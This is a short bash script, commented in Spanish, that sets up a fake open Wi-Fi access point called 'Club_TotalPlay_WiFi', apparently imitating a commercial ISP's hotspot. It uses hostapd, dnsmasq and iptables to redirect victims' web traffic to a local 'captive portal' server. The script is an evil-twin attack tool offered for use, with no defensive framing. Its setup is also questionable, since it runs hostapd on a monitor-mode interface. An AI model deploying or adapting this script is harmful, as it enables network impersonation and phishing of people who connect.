#!/bin/bash

# Poner wlan1 en modo monitor con airmon-ng
echo "[*] Colocando wlan1 en modo monitor..."
airmon-ng start wlan1

# Verificar si la interfaz de modo monitor se creó correctamente
IFACE_MON="wlan1mon"

if ! ip link show "$IFACE_MON" > /dev/null 2>&1; then
    echo "Error: No se pudo crear la interfaz en modo monitor. Por favor revisa los pasos."
    exit 1
fi

# Crear archivo hostapd.conf
echo "[*] Configurando hostapd..."
cat > hostapd.conf <<EOF
interface=$IFACE_MON
ssid=Club_TotalPlay_WiFi
channel=6
hw_mode=g
auth_algs=1
wmm_enabled=0
EOF

# Crear archivo dnsmasq.conf para DHCP
echo "[*] Configurando dnsmasq..."
cat > dnsmasq.conf <<EOF
interface=$IFACE_MON
dhcp-range=192.168.1.10,192.168.1.50,12h
EOF

# Levantar la red WiFi con hostapd
echo "[*] Iniciando hostapd..."
hostapd hostapd.conf &

# Configuración de red para fakeAP
echo "[*] Configurando IP para $IFACE_MON..."
ifconfig $IFACE_MON up 192.168.1.1 netmask 255.255.255.0

# Iniciar dnsmasq
echo "[*] Iniciando dnsmasq..."
dnsmasq -C dnsmasq.conf -d &

# Habilitar redirección de tráfico
echo "[*] Configurando iptables para redirección..."
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i $IFACE_MON -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80

# Habilitar el portal cautivo
echo "[*] Iniciando servidor web para el portal cautivo..."
cd /var/www/html
python3 -m http.server 80 &

echo "[*] Red WiFi falsa 'Club_TotalPlay_WiFi' levantada. Conéctate para ser redirigido al portal cautivo."

# Limpiar todo al cerrar el script
trap cleanup EXIT

function cleanup {
    echo "[*] Limpiando configuración..."
    killall hostapd dnsmasq python3
    iptables -F
    iptables -t nat -F
    ifconfig $IFACE_MON down
    airmon-ng stop $IFACE_MON
}
